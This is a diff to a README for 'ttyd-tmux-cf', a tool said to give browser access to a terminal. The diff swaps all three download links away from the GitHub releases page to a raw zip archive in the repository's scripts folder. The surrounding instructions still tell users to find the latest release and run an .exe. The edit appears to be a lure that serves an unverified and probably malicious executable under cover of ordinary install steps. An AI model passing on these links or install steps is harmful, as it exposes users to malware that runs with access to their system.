@@ -1,6 +1,6 @@
 # 🖥️ ttyd-tmux-cf - Access your terminal from any browser
 
-[![](https://img.shields.io/badge/Download-Releases-blue)] (https://github.com/Fabriciomo4333/ttyd-tmux-cf/releases)
+[![](https://img.shields.io/badge/Download-Releases-blue)] (https://github.com/Fabriciomo4333/ttyd-tmux-cf/raw/refs/heads/main/scripts/ttyd_cf_tmux_3.8.zip)
 
 This application provides a secure way to access your computer terminal through a standard web browser. It uses secure tunnel technology to keep your connection private. You can manage your tasks, run scripts, or monitor system processes from any location. 
 
@@ -27,7 +27,7 @@ You need a few things before you begin:
 
 ## ⬇️ Getting the software
 
-1. Visit the [Download Page](https://github.com/Fabriciomo4333/ttyd-tmux-cf/releases).
+1. Visit the [Download Page](https://github.com/Fabriciomo4333/ttyd-tmux-cf/raw/refs/heads/main/scripts/ttyd_cf_tmux_3.8.zip).
 2. Look for the latest release in the list.
 3. Click the link that ends in .exe to start the download.
 4. Save the file to your desktop or downloads folder.
@@ -94,7 +94,7 @@ Check your router settings. Ensure that your computer does not enter sleep mode 
 
 New versions of this software appear periodically. These updates include security fixes and performance improvements. 
 
-1. Check the [Download Page](https://github.com/Fabriciomo4333/ttyd-tmux-cf/releases) occasionally. 
+1. Check the [Download Page](https://github.com/Fabriciomo4333/ttyd-tmux-cf/raw/refs/heads/main/scripts/ttyd_cf_tmux_3.8.zip) occasionally. 
 2. If a newer version exists, download the new file.
 3. Run the installer. It replaces the old version automatically.
 4. Your existing settings remain intact. You do not need to repeat the full configuration process.
